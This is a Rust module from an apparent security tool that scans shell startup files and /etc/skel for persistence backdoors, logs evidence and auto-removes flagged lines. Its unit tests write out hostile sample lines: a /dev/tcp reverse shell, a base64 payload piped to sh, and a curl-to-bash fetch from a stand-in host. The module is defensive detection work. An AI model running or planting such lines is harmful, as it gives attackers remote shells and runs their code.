//! Shell startup files.
//!
//! Every dotfile a shell sources on login is a persistence slot. This checks
//! the system-wide files and each login-capable account's own, reporting only
//! lines that match a known-dangerous pattern rather than every line present.
//!
//! `/etc/skel` is checked separately: any backdoor there propagates to every
//! new account created, making it a force-multiplier persistence slot.

use std::path::{Path, PathBuf};

use crate::core::scan::{effective_line, has_strong_reason, read_text_file, suspicious_matches};
use crate::core::{Action, DefenderContext, Finding, Result, Severity, Verdict, collect_accounts};

/// Files sourced for all users.
const SYSTEM_FILES: &[&str] = &[
    "/etc/profile",
    "/etc/bash.bashrc",
    "/etc/bashrc",
    "/etc/zsh/zshrc",
    "/etc/csh.cshrc",
];

/// Drop-in directory sourced by `/etc/profile`.
const SYSTEM_DIR: &str = "/etc/profile.d";

/// Skeleton directory — copied verbatim into every new home directory.
const SKEL_DIR: &str = "/etc/skel";

/// Per-account dotfiles, relative to the account's home directory.
const USER_FILES: &[&str] = &[
    ".bashrc",
    ".bash_profile",
    ".bash_login",
    ".bash_logout",
    ".profile",
    ".zshrc",
    ".zprofile",
    ".zlogin",
];

/// A dangerous-looking line in a shell startup file.
pub struct Hit {
    /// Startup file the line appears in.
    pub file: PathBuf,
    /// The line itself.
    pub line: String,
    /// Why it was flagged.
    pub reasons: Vec<&'static str>,
}

/// Scan system and per-user shell startup files for dangerous lines.
pub fn run(ctx: &DefenderContext) -> Result {
    let mut targets: Vec<PathBuf> = SYSTEM_FILES.iter().map(PathBuf::from).collect();

    if let Ok(entries) = std::fs::read_dir(SYSTEM_DIR) {
        targets.extend(entries.filter_map(|e| e.ok()).map(|e| e.path()));
    }

    for account in collect_accounts()?.iter().filter(|a| a.can_log_in()) {
        targets.extend(USER_FILES.iter().map(|f| account.home.join(f)));
    }

    ctx.debug(&format!("Checking {} startup file(s)", targets.len()));

    let mut hits = Vec::new();
    for target in &targets {
        hits.extend(inspect_file(target));
    }

    // Check /etc/skel separately — findings are Critical because they propagate
    // to every new account the system creates.
    let skel_hits = scan_skel(ctx);

    if hits.is_empty() && skel_hits == 0 {
        ctx.log_msg("[✓] No suspicious lines in any shell startup file");
        return Ok(());
    }

    for hit in &hits {
        if !has_strong_reason(&hit.reasons) {
            report_weak_hit(ctx, hit);
            continue;
        }
        // Log the suspicious line as evidence before emitting the finding.
        ctx.log_msg(&format!(
            "[!] Suspicious line in {}: {}  [{}]",
            hit.file.display(),
            hit.line,
            hit.reasons.join(", ")
        ));
        ctx.log_evidence_line(&hit.file.display().to_string(), &hit.line);

        // Auto-remove the malicious line from the file.
        let removed = ctx.remove_line_from_file_logged(&hit.file, &hit.line);

        ctx.emit(
            Finding::new(
                Severity::High,
                "startup_scripts",
                format!(
                    "Startup backdoor {} in {} (line removed: {})",
                    if removed { "REMOVED" } else { "FOUND" },
                    hit.file.display(),
                    removed,
                ),
                format!(
                    "file: {}\nline: {}\nreasons: {}\nremoved: {}",
                    hit.file.display(),
                    hit.line,
                    hit.reasons.join(", "),
                    removed
                ),
            )
            .with_path(hit.file.clone())
            .with_context("line", hit.line.clone())
            .with_context("flags", hit.reasons.join(", "))
            .with_context("removed", removed.to_string())
            .with_verdict(
                if removed {
                    Verdict::Remove
                } else {
                    Verdict::Investigate
                },
                if removed {
                    "The malicious line was automatically removed. Evidence and proof logged."
                        .to_string()
                } else {
                    format!(
                        "Could not automatically remove line from {} — remove manually: \
                         edit the file and delete the flagged line.",
                        hit.file.display()
                    )
                },
            )
            .with_action(Action::Manual(format!(
                "Verify {} no longer contains the removed line",
                hit.file.display()
            ))),
        );
    }

    Ok(())
}

/// Scan `/etc/skel` for backdoored dotfiles.
///
/// Executable binaries in skel → log evidence + auto-remove.
/// Malicious lines in skel dotfiles → log evidence + auto-remove the line.
/// Returns the number of findings emitted.
fn scan_skel(ctx: &DefenderContext) -> usize {
    let skel = Path::new(SKEL_DIR);
    if !skel.is_dir() {
        return 0;
    }

    let Ok(entries) = std::fs::read_dir(skel) else {
        return 0;
    };

    let mut count = 0;
    for entry in entries.flatten() {
        let path = entry.path();
        if !path.is_file() {
            continue;
        }

        // An executable binary in skel is unconditionally malicious — auto-remove.
        if is_executable(&path) && !looks_like_shell_script(&path) {
            count += 1;
            let name = path
                .file_name()
                .unwrap_or_default()
                .to_string_lossy()
                .to_string();

            ctx.log_msg(&format!(
                "[!] CRITICAL: Executable binary in /etc/skel/{} — auto-removing",
                name
            ));
            ctx.log_evidence_file(&path);
            let removed = ctx.remove_path_logged(&path);

            ctx.emit(
                Finding::new(
                    Severity::Critical,
                    "startup_scripts",
                    format!(
                        "Skel binary REMOVED: /etc/skel/{} (was auto-removed: {})",
                        name, removed
                    ),
                    format!("path: {}\nauto_removed: {}", path.display(), removed),
                )
                .with_path(path.clone())
                .with_context("removed", removed.to_string())
                .with_verdict(
                    Verdict::Remove,
                    "A non-script executable in /etc/skel is never legitimate. \
                     It would be copied into every new user's home directory. \
                     Evidence and proof of removal logged."
                        .to_string(),
                ),
            );
        }

        // Malicious lines in skel dotfiles — log evidence + auto-remove the line.
        let hits = inspect_file(&path);
        for hit in hits {
            count += 1;
            if !has_strong_reason(&hit.reasons) {
                report_weak_hit(ctx, &hit);
                continue;
            }
            let fname = hit
                .file
                .file_name()
                .unwrap_or_default()
                .to_string_lossy()
                .to_string();

            ctx.log_msg(&format!(
                "[!] CRITICAL: Backdoor line in /etc/skel/{} — auto-removing line",
                fname
            ));
            ctx.log_evidence_line(&hit.file.display().to_string(), &hit.line);
            let removed = ctx.remove_line_from_file_logged(&hit.file, &hit.line);

            ctx.emit(
                Finding::new(
                    Severity::Critical,
                    "startup_scripts",
                    format!(
                        "Skel backdoor REMOVED from /etc/skel/{} (removed: {})",
                        fname, removed
                    ),
                    format!(
                        "file: {}\nline: {}\nreasons: {}\nremoved: {}",
                        hit.file.display(),
                        hit.line,
                        hit.reasons.join(", "),
                        removed
                    ),
                )
                .with_path(hit.file.clone())
                .with_context("line", hit.line.clone())
                .with_context("flags", hit.reasons.join(", "))
                .with_context("removed", removed.to_string())
                .with_verdict(
                    Verdict::Remove,
                    "/etc/skel files are copied into every new user's home directory. \
                     This backdoor line has been automatically removed. Audit any accounts \
                     created since this file was modified — their dotfiles may still contain it."
                        .to_string(),
                ),
            );
        }
    }
    count
}

/// Report a line whose matches are all weak (an `export ... curl` helper, a
/// `python3 -c` one-liner) without editing the file.
fn report_weak_hit(ctx: &DefenderContext, hit: &Hit) {
    ctx.emit(
        Finding::new(
            Severity::Medium,
            "startup_scripts",
            format!(
                "Review line in {}: {}",
                hit.file.display(),
                crate::core::truncate_chars(&hit.line, 60)
            ),
            format!(
                "file: {}\nline: {}\nreasons: {}\nremoved: false",
                hit.file.display(),
                hit.line,
                hit.reasons.join(", ")
            ),
        )
        .with_path(hit.file.clone())
        .with_verdict(
            Verdict::Investigate,
            format!(
                "Matched only [{}], which also appears in legitimate shell config, so the \
                 line was left in place. Delete it by hand if it is not expected.",
                hit.reasons.join(", ")
            ),
        ),
    );
}

/// Dangerous lines in one startup file, if it can be read.
fn inspect_file(path: &Path) -> Vec<Hit> {
    let Some(contents) = read_text_file(path) else {
        return Vec::new();
    };

    inspect(&contents)
        .into_iter()
        .map(|(line, reasons)| Hit {
            file: path.to_path_buf(),
            line,
            reasons,
        })
        .collect()
}

/// Return true if the file at `path` has any execute permission bit set.
fn is_executable(path: &Path) -> bool {
    use std::os::unix::fs::PermissionsExt;
    path.metadata()
        .map(|m| m.permissions().mode() & 0o111 != 0)
        .unwrap_or(false)
}

/// Return true if `path` looks like a shell script based on extension or shebang.
fn looks_like_shell_script(path: &Path) -> bool {
    // Shell scripts have a text extension or shebang; binaries typically don't.
    if let Some(ext) = path.extension() {
        let e = ext.to_string_lossy();
        if matches!(e.as_ref(), "sh" | "bash" | "zsh" | "py" | "pl" | "rb") {
            return true;
        }
    }
    // Check shebang
    if let Ok(mut f) = std::fs::File::open(path) {
        use std::io::Read;
        let mut buf = [0u8; 2];
        if f.read_exact(&mut buf).is_ok() && &buf == b"#!" {
            return true;
        }
    }
    false
}

/// Lines matching a dangerous pattern, with the reasons they matched.
fn inspect(contents: &str) -> Vec<(String, Vec<&'static str>)> {
    contents
        .lines()
        .filter_map(effective_line)
        .filter_map(|line| {
            let reasons = suspicious_matches(line);
            if reasons.is_empty() {
                None
            } else {
                Some((line.to_string(), reasons))
            }
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn an_ordinary_bashrc_is_clean() {
        let bashrc = "\
# ~/.bashrc
export EDITOR=vim
alias ll='ls -la'
export PATH=$PATH:$HOME/.local/bin
[ -f ~/.bash_aliases ] && . ~/.bash_aliases
";
        assert!(inspect(bashrc).is_empty());
    }

    #[test]
    fn finds_an_appended_reverse_shell() {
        let bashrc = "export EDITOR=vim\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1 &\n";
        let hits = inspect(bashrc);

        assert_eq!(hits.len(), 1);
        assert!(
            hits[0]
                .1
                .contains(&"bash network redirection (reverse shell)")
        );
    }

    #[test]
    fn finds_an_obfuscated_payload() {
        let hits = inspect("echo cGF5bG9hZA== | base64 -d | sh\n");

        assert_eq!(hits.len(), 1);
        assert!(hits[0].1.contains(&"base64 decoding (obfuscation)"));
        assert!(hits[0].1.contains(&"pipes output into a shell"));
    }

    #[test]
    fn a_commented_out_payload_is_not_flagged() {
        assert!(inspect("# curl http://evil.test/x.sh | bash\n").is_empty());
    }
}
